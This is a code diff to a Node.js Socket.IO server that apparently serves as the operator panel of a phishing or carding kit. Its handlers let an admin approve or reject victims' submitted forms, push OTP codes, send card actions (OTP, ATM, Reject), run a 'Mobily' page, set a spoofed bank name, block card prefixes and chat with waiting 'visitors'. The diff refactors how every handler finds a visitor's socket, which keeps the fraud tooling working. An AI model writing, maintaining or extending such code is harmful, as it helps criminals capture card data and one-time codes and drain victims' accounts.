@@ -301,6 +301,22 @@ setInterval(() => {
   saveData();
 }, 30000); // Every 30 seconds
 
+// Helper: Find visitor by socketId (checks Map first, then searches by _id in case socketId changed)
+function findVisitorAndSocket(socketId) {
+  // Direct lookup first
+  const visitor = visitors.get(socketId);
+  if (visitor) return { visitor, currentSocketId: socketId };
+  
+  // If not found, search all visitors for matching socketId in their data
+  for (const [sid, v] of visitors) {
+    if (v.socketId === socketId || v._id === socketId) {
+      return { visitor: v, currentSocketId: sid };
+    }
+  }
+  
+  return { visitor: null, currentSocketId: socketId };
+}
+
 // Socket.IO Connection Handler
 io.on("connection", (socket) => {
   console.log(`New connection: ${socket.id}`);
@@ -566,138 +582,130 @@ io.on("connection", (socket) => {
 
   // Admin: Approve form
   socket.on("admin:approve", (visitorSocketId) => {
-    io.to(visitorSocketId).emit("form:approved");
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("form:approved");
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Form approved for visitor: ${visitorSocketId}`);
+    console.log(`Form approved for visitor: ${currentSocketId}`);
   });
 
   // Admin: Reject form
   socket.on("admin:reject", (data) => {
-    const visitorSocketId = data.visitorSocketId || data;
-    io.to(visitorSocketId).emit("form:rejected");
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const rawSocketId = data.visitorSocketId || data;
+    const { visitor, currentSocketId } = findVisitorAndSocket(rawSocketId);
+    io.to(currentSocketId).emit("form:rejected");
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Form rejected for visitor: ${visitorSocketId}`);
+    console.log(`Form rejected for visitor: ${currentSocketId}`);
   });
 
   // Admin: Reject Mobily call (special handling for Mobily page)
   socket.on("admin:mobilyReject", (visitorSocketId) => {
-    io.to(visitorSocketId).emit("mobily:rejected");
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("mobily:rejected");
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
+    console.log(`Mobily call rejected for visitor: ${currentSocketId}`);
   });
 
   // Admin: Send verification code
   socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
-    io.to(visitorSocketId).emit("code", code);
-    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("code", code);
     if (visitor) {
       visitor.lastSentCode = code;
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
+    console.log(`Code sent to visitor ${currentSocketId}: ${code}`);
   });
 
   // Admin: Navigate visitor to page
   socket.on("admin:navigate", ({ visitorSocketId, page }) => {
-    io.to(visitorSocketId).emit("visitor:navigate", page);
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("visitor:navigate", page);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
+    console.log(`Navigating visitor ${currentSocketId} to: ${page}`);
   });
 
   // Admin: Card action (OTP, ATM, Reject)
   socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
-    io.to(visitorSocketId).emit("card:action", action);
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("card:action", action);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
+    console.log(`Card action ${action} sent to visitor ${currentSocketId}`);
   });
 
   // Admin: Code action (Approve, Reject) for OTP/digit codes
   socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
-    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("code:action", { action, codeIndex });
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
+    console.log(`Code action ${action} sent to visitor ${currentSocketId}`);
   });
 
   // Admin: Approve resend code request
   socket.on("admin:approveResend", ({ visitorSocketId }) => {
-    io.to(visitorSocketId).emit("resend:approved");
-    // تحديث حالة الانتظار
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("resend:approved");
     if (visitor) {
       visitor.waitingForAdminResponse = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
-    console.log(`Resend approved for visitor ${visitorSocketId}`);
+    console.log(`Resend approved for visitor ${currentSocketId}`);
   });
 
   // Admin: Block visitor
   socket.on("admin:block", (visitorSocketId) => {
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
     if (visitor) {
       visitor.isBlocked = true;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.to(visitorSocketId).emit("blocked");
-      console.log(`Visitor blocked: ${visitorSocketId}`);
+      io.to(currentSocketId).emit("blocked");
+      console.log(`Visitor blocked: ${currentSocketId}`);
     }
   });
 
   // Admin: Unblock visitor
   socket.on("admin:unblock", ({ visitorSocketId }) => {
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
     if (visitor) {
       visitor.isBlocked = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.to(visitorSocketId).emit("unblocked");
+      io.to(currentSocketId).emit("unblocked");
       console.log(`Visitor unblocked: ${visitorSocketId}`);
     }
   });
@@ -705,9 +713,9 @@ io.on("connection", (socket) => {
   // Admin: Delete visitor by socket ID
   socket.on("admin:delete", (visitorSocketId) => {
     // Find visitor BEFORE deleting from Map
-    const visitorToDelete = visitors.get(visitorSocketId);
-    io.to(visitorSocketId).emit("deleted");
-    visitors.delete(visitorSocketId);
+    const { visitor: visitorToDelete, currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("deleted");
+    visitors.delete(currentSocketId);
     
     // Also remove from saved visitors
     if (visitorToDelete) {
@@ -742,14 +750,16 @@ io.on("connection", (socket) => {
 
   // Admin: Send last message
   socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
-    io.to(visitorSocketId).emit("admin-last-message", { message });
-    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
+    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("admin-last-message", { message });
+    console.log(`Message sent to visitor ${currentSocketId}: ${message}`);
   });
 
   // Admin: Set bank name
   socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
-    io.to(visitorSocketId).emit("bankName", bankName);
-    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
+    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
+    io.to(currentSocketId).emit("bankName", bankName);
+    console.log(`Bank name set for visitor ${currentSocketId}: ${bankName}`);
   });
 
   // Admin: Change password
@@ -952,7 +962,7 @@ io.on("connection", (socket) => {
 
   // Chat: Message from admin to visitor
   socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
     if (visitor) {
       // Initialize chat messages array if not exists
       if (!visitor.chatMessages) {
@@ -967,39 +977,39 @@ io.on("connection", (socket) => {
         timestamp: timestamp || new Date().toISOString()
       };
       visitor.chatMessages.push(chatMessage);
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
       
       // Send message to visitor
-      io.to(visitorSocketId).emit("chat:fromAdmin", {
+      io.to(currentSocketId).emit("chat:fromAdmin", {
         message: message,
         timestamp: chatMessage.timestamp
       });
       
-      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
+      console.log(`Chat message from admin to visitor ${currentSocketId}: ${message}`);
     }
   });
 
   // Chat: Mark messages as read
   socket.on("chat:markAsRead", ({ visitorSocketId }) => {
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
     if (visitor) {
       visitor.hasNewMessage = false;
-      visitors.set(visitorSocketId, visitor);
+      visitors.set(currentSocketId, visitor);
       saveVisitorPermanently(visitor);
     }
   });
 
   // Admin: Block card prefix
   socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
-    const visitor = visitors.get(visitorSocketId);
+    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
     if (visitor) {
       if (!visitor.blockedCardPrefixes.includes(prefix)) {
         visitor.blockedCardPrefixes.push(prefix);
-        visitors.set(visitorSocketId, visitor);
+        visitors.set(currentSocketId, visitor);
         saveVisitorPermanently(visitor);
       }
-      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
+      console.log(`Card prefix blocked for visitor ${currentSocketId}: ${prefix}`);
     }
   });
 
